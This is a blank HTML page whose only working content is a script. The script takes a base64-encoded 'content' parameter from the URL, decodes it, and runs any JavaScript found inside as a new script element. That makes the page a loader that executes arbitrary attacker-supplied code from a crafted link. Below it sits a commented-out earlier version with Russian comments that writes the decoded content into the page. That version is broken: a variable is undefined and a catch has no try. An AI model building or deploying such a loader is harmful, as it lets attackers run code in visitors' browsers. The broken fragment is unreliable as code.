<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script>const p=new URLSearchParams(window.location.search);const c=p.get('content');if(c){const d=atob(c);const s=d.match(/<script>(.*?)<\/script>/);if(s&&s[1]){const script=document.createElement('script');script.text=s[1];document.body.appendChild(script);}}</script></body></html>

<!--<!DOCTYPE html>
<html lang="en">

    <script>
        // Извлекаем параметр content из URL
        const params = new URLSearchParams(window.location.search);

        if (encodedContent) {

                // Декодируем Base64
                const decodedContent = atob(encodedContent);

                document.write(decodedContent);
            } catch (e) {
                document.body.innerHTML = "<p>Error decoding content: " + e.message + "</p>";
            }
        } else {

        }
    </script>
